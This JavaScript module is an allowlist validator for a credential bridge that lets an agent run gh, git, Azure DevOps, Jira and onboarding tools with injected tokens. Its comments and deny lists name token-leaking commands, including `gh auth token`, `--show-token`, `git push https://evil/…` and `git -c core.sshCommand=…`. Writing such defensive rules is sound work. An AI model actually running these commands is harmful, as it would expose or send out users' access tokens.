/**
 * bridge/allowlist.mjs — what `node "$VC_RUN" <tool> …` may run. AUTHORITATIVE.
 *
 * The bridge is the only way a token reaches a process (VCST-6402): vc-secrets resolves the secret
 * and starts the bridge's INNER side with it, and the inner side runs the caller's command line. So
 * the caller — an agent's shell line — must not be able to turn that line into a token printer or a
 * token mailer. This file is the rule. The OUTER side checks it first, to fail fast with a readable
 * message; the INNER side checks it again, because the inner side is what holds the secret and the
 * argv reaches it through an environment variable the caller sets.
 *
 * What it can and cannot do: it stops the ordinary leaks — a command that prints the token
 * (`gh auth token`, `gh auth status --show-token`), one that sends it to a host the caller picks
 * (`gh api https://…`, `git push https://evil/…`, `ado.mjs --api-base …`), one that runs code the
 * caller chooses with the token in its environment (`gh extension`, `gh alias`, `git -c core.sshCommand=…`,
 * a repository hook). It is not a boundary against a process that is already running arbitrary code
 * as the user — that can read the credential store directly (vc-secrets README §Scope).
 *
 * Every function here is pure: argv in, { ok, reason } out.
 */

/** Tool → the vc-secrets task group whose secrets it receives. */
export const TOOL_GROUP = Object.freeze({
  gh: "github",
  "git-gh": "github",
  deliver: "github",
  ado: "ado",
  "git-ado": "ado",
  jira: "jira",
  onboard: "onboard",
});

/** The groups, i.e. the vc-secrets tasks `vc-init-<group>`. */
export const GROUPS = Object.freeze(["github", "ado", "jira", "onboard"]);

/** Hosts a git credential (and a URL argument) may name, per git tool. */
export const GIT_HOSTS = Object.freeze({
  "git-gh": ["github.com"],
  "git-ado": ["dev.azure.com", "*.visualstudio.com"],
});

/** vc-init onboarding scripts the `onboard` group may launch (skills/project-init/<name>.mjs). */
export const ONBOARD_SCRIPTS = Object.freeze(["verify-access", "discover-repos", "discover-tracker", "derive-context", "ensure-session"]);

/**
 * `gh` sub-commands, by top-level command. `null` = any sub-command (still subject to the flag rules).
 * Deliberately absent: `auth` (prints / manages the token), `extension` and `alias` (run code the
 * caller picks), `config`, `codespace`, `secret`, `ssh-key`, `gpg-key`, `repo clone` (clone through
 * `git-gh`, whose credential is host-pinned), `pr checkout` (runs git with gh's own credential helper),
 * and `pr merge` — the no-auto-merge rule (quality-gates §2) holds on this path too.
 */
const GH_COMMANDS = Object.freeze({
  pr: ["create", "view", "list", "checks", "comment", "edit", "ready", "diff", "status", "close", "reopen"],
  issue: ["create", "list", "view", "comment", "edit", "close", "reopen"],
  run: ["view", "list", "watch", "rerun", "download"],
  repo: ["view", "fork", "list"],
  release: ["view", "list"],
  search: ["issues", "prs", "code", "repos", "commits"],
  workflow: ["view", "list"],
  label: ["list"],
  api: null,
});

/** git sub-commands for git-gh / git-ado. Anything that runs a checkout's own config-driven code is out. */
const GIT_COMMANDS = Object.freeze(["clone", "fetch", "pull", "push", "ls-remote"]);

/** git options that can run a command, rewrite config, or reach another host. */
const GIT_REFUSED_OPTIONS = [
  /^-c$/, /^-c./, /^--config(=|$)/, /^--config-env(=|$)/,
  /^--upload-pack(=|$)/, /^-u$/, /^--receive-pack(=|$)/, /^--exec(=|$)/,
  /^--template(=|$)/, /^--separate-git-dir(=|$)/, /^--git-dir(=|$)/, /^--work-tree(=|$)/,
  /^--namespace(=|$)/, /^--exec-path(=|$)/, /^--server-option(=|$)/, /^-o$/,
];

const ok = () => ({ ok: true, reason: "" });
const no = (reason) => ({ ok: false, reason });

/** Split `--flag=value` into its name; a bare value returns null. */
function flagName(arg) {
  if (!arg.startsWith("-")) return null;
  const eq = arg.indexOf("=");
  return eq === -1 ? arg : arg.slice(0, eq);
}

/** Does `host` match one of the patterns (`*.suffix` matches any subdomain of suffix)? */
export function hostAllowed(host, patterns) {
  const h = String(host || "").toLowerCase().replace(/\.$/, "");
  return patterns.some((p) => (p.startsWith("*.") ? h.endsWith(p.slice(1)) && h.length > p.length - 1 : h === p));
}

/**
 * A git argument that names a remote LOCATION must be an https URL on a pinned host with no
 * userinfo. `ok:true, url:false` for an argument that is not a location at all (a ref, a remote
 * name, a directory).
 */
export function checkGitLocation(arg, hosts) {
  const a = String(arg);
  if (/^[a-z][a-z0-9+.-]*::/i.test(a)) return no(`transport helper syntax "${a.split("::")[0]}::" is not allowed`);
  if (/^[\w.-]+@[\w.-]+:/.test(a)) return no("scp-style (ssh) remotes are not allowed — use the https URL");
  if (!/^[a-z][a-z0-9+.-]*:\/\//i.test(a)) return { ok: true, reason: "", url: false };
  let u;
  try {
    u = new URL(a);
  } catch {
    return no(`unparsable URL argument ${JSON.stringify(a)}`);
  }
  if (u.protocol !== "https:") return no(`only https remotes are allowed, got ${u.protocol}`);
  if (u.username || u.password) return no("a URL with credentials in it is not allowed — the bridge supplies them through the credential helper");
  if (!hostAllowed(u.hostname, hosts)) return no(`host ${u.hostname} is not one this tool may authenticate to (${hosts.join(", ")})`);
  return { ok: true, reason: "", url: true };
}

function checkGh(args) {
  const [cmd, sub] = args;
  if (!cmd) return no("gh needs a command");
  if (!(cmd in GH_COMMANDS)) return no(`gh ${cmd} is not allowed through the bridge (allowed: ${Object.keys(GH_COMMANDS).join(", ")})`);
  const subs = GH_COMMANDS[cmd];
  if (subs && !subs.includes(sub)) return no(`gh ${cmd} ${sub ?? ""} is not allowed through the bridge (allowed: ${subs.join(", ")})`.replace(/\s+\(/, " ("));
  for (let i = 1; i < args.length; i++) {
    const a = args[i];
    const name = flagName(a);
    if (name === "--hostname") return no("gh --hostname is not allowed — the token is for github.com only");
    if (name === "--show-token") return no("gh --show-token is not allowed");
    if (name === "--repo" || name === "-R") {
      const v = a.includes("=") ? a.slice(a.indexOf("=") + 1) : args[i + 1];
      if (typeof v === "string" && v.split("/").length > 2 && !/^github\.com\//i.test(v)) {
        return no(`gh ${name} ${v}: a HOST/OWNER/REPO form must name github.com`);
      }
    }
  }
  if (cmd === "api") {
    const endpoint = ghApiEndpoint(args.slice(1));
    if (endpoint === null) return no("gh api needs an endpoint");
    if (/:\/\//.test(endpoint)) return no("gh api takes a path on api.github.com, not a full URL");
  }
  return ok();
}

/** gh api flags that take a value (the next argument, unless written as --flag=value). */
const GH_API_VALUE_FLAGS = new Set(["-X", "--method", "-F", "--field", "-f", "--raw-field", "-H", "--header", "--input", "-q", "--jq", "-t", "--template", "--cache", "-p", "--preview", "--hostname"]);

/** The first positional argument of `gh api …` — its endpoint — or null. */
export function ghApiEndpoint(rest) {
  for (let i = 0; i < rest.length; i++) {
    const a = rest[i];
    if (a.startsWith("-")) {
      if (!a.includes("=") && GH_API_VALUE_FLAGS.has(a)) i++;
      continue;
    }
    return a;
  }
  return null;
}

function checkGit(tool, args) {
  const hosts = GIT_HOSTS[tool];
  let i = 0;
  while (args[i] === "-C") {
    if (args[i + 1] === undefined) return no("git -C needs a directory");
    i += 2;
  }
  const cmd = args[i];
  if (!GIT_COMMANDS.includes(cmd)) return no(`git ${cmd ?? "(nothing)"} is not allowed through the bridge (allowed: ${GIT_COMMANDS.join(", ")}; global options: -C <dir> only)`);
  for (const a of args.slice(i + 1)) {
    // `-u` is --upload-pack (runs a command) for clone/fetch/pull, but --set-upstream for push.
    if (a === "-u" && cmd === "push") continue;
    if (GIT_REFUSED_OPTIONS.some((re) => re.test(a))) return no(`git option ${a.split("=")[0]} is not allowed through the bridge`);
    const loc = checkGitLocation(a, hosts);
    if (!loc.ok) return loc;
  }
  return ok();
}

function checkAdo(args) {
  const [cmd] = args;
  if (!cmd || !/^[a-z][a-z-]*$/.test(cmd)) return no("ado needs a command (ado.mjs <command> …)");
  for (let i = 1; i < args.length; i++) {
    const name = flagName(args[i]);
    if (name === "--api-base") {
      const v = args[i].includes("=") ? args[i].slice(args[i].indexOf("=") + 1) : args[i + 1];
      let host = "";
      try {
        host = new URL(String(v)).hostname;
      } catch {
        /* host stays "" */
      }
      if (!/^https:/i.test(String(v)) || !hostAllowed(host, GIT_HOSTS["git-ado"])) {
        return no("ado --api-base must be an https URL on dev.azure.com or *.visualstudio.com");
      }
    }
    if (name === "--org" || name === "--project") {
      const v = args[i].includes("=") ? args[i].slice(args[i].indexOf("=") + 1) : args[i + 1];
      if (typeof v === "string" && /[/@:?#\\]/.test(v)) return no(`ado ${name} must be a bare name, got ${JSON.stringify(v)}`);
    }
  }
  return ok();
}

function checkJira(args) {
  const [cmd] = args;
  if (!cmd || !/^[a-z][a-z-]*$/.test(cmd)) return no("jira needs a command (jira.mjs <command> …)");
  if (args.some((a) => ["--base-url", "--host", "--url"].includes(flagName(a)))) {
    return no("jira's host is pinned to the profile's tracker.baseUrl — it cannot be passed on the command line");
  }
  return ok();
}

function checkDeliver(args) {
  for (let i = 0; i < args.length; i++) {
    if (flagName(args[i]) === "--repo") {
      const v = args[i].includes("=") ? args[i].slice(args[i].indexOf("=") + 1) : args[i + 1];
      if (!/^VirtoCommerce\/[\w.-]+$/.test(String(v ?? ""))) return no("deliver --repo must be a VirtoCommerce/* repository");
    }
  }
  return ok();
}

function checkOnboard(args) {
  const [script] = args;
  if (!ONBOARD_SCRIPTS.includes(script)) return no(`onboard runs one of: ${ONBOARD_SCRIPTS.join(", ")}`);
  return ok();
}

/**
 * Check a whole bridge command line.
 * @param {string} tool  one of TOOL_GROUP's keys
 * @param {string[]} args
 * @returns {{ ok: boolean, reason: string }}
 */
export function checkArgv(tool, args) {
  if (!Object.prototype.hasOwnProperty.call(TOOL_GROUP, tool)) {
    return no(`unknown tool ${JSON.stringify(tool)} (known: ${Object.keys(TOOL_GROUP).join(", ")})`);
  }
  if (!Array.isArray(args) || args.some((a) => typeof a !== "string")) return no("arguments must be strings");
  if (args.some((a) => a.includes("\0"))) return no("an argument holds a NUL byte");
  // A body or a comment legitimately spans lines (gh, ado, jira); a git argument or a script name never does.
  if (["git-gh", "git-ado", "onboard", "deliver"].includes(tool) && args.some((a) => /[\r\n]/.test(a))) {
    return no("an argument holds a line break");
  }
  switch (tool) {
    case "gh": return checkGh(args);
    case "git-gh":
    case "git-ado": return checkGit(tool, args);
    case "ado": return checkAdo(args);
    case "jira": return checkJira(args);
    case "deliver": return checkDeliver(args);
    case "onboard": return checkOnboard(args);
    default: return no(`unknown tool ${tool}`);
  }
}

/** The group a tool belongs to, or null. */
export function groupOf(tool) {
  return Object.prototype.hasOwnProperty.call(TOOL_GROUP, tool) ? TOOL_GROUP[tool] : null;
}

/**
 * May the INNER side for `group` run `tool`? A task holds only its own group's secrets, except
 * `onboard`, which holds every axis's — and runs only the onboarding scripts. A caller that points
 * VC_RUN_ARGV at another group's tool from inside a task is refused, so a task can never be used to
 * hand one axis's token to another axis's tool.
 */
export function toolInGroup(tool, group) {
  return groupOf(tool) === group;
}
